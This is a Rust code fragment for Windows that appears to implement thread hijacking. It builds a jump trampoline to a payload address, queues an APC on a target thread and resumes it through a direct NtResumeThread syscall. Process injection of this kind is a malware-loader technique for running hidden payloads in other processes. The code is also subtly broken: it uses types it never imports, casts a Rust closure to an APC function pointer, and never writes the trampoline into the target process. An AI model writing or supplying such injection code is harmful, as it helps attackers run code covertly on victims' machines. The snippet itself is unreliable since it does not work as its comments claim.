use std::ptr::null_mut;
use winapi::um::winnt::{HANDLE, PVOID, ULONG};
use winapi::um::processthreadsapi::QueueUserAPC;
use winapi::um::winnt::{NT_SUCCESS};
use syscall::syscall;

fn jmp_hijack_thread(h_thread: HANDLE, p_address: PVOID, h_process: HANDLE) -> Result<(), String> {
    // Construct and write the trampoline directly to a safe memory region in the target process
    let mut trampoline = [
        0x48, 0xB8,
        // placeholder bytes
        0x11,
        0x22,
        0x33,
        0x44,
        0x55,
        0x66,
        0x77,
        0x88,
        0xFF,
        0xE0
    ];
    let p_address_bytes: [u8; 8] = unsafe {
        std::mem::transmute(p_address as u64)
    };
    trampoline[2..10].copy_from_slice(&p_address_bytes);

    // Execute the payload using APC injection
    let apc_executed = Arc::new(Mutex::new(false));
    let apc_executed_clone = Arc::clone(&apc_executed);
    let apc_function: PAPCFUNC = Box::into_raw(Box::new(move |_| {
        if let Ok(mut executed) = apc_executed.lock() {
            if !*executed {
                // Execute payload here
                // Example: println!("Payload executed successfully");
                *executed = true;
            }
        }
    }));

    unsafe {
        QueueUserAPC(Some(*apc_function), h_thread, null_mut());
    }

    // Resume the suspended thread
    let status_resume = unsafe { syscall!("NtResumeThread", h_thread, null_mut::<ULONG>()) };
    if !NT_SUCCESS(status_resume) {
        return Err(format!("[!] Failed to resume thread with NTSTATUS: {:#X}", status_resume));
    }

    // Wait for the payload execution to complete
    while !*apc_executed_clone.lock().unwrap() {
        std::thread::sleep(std::time::Duration::from_millis(100));
    }

    Ok(())
}
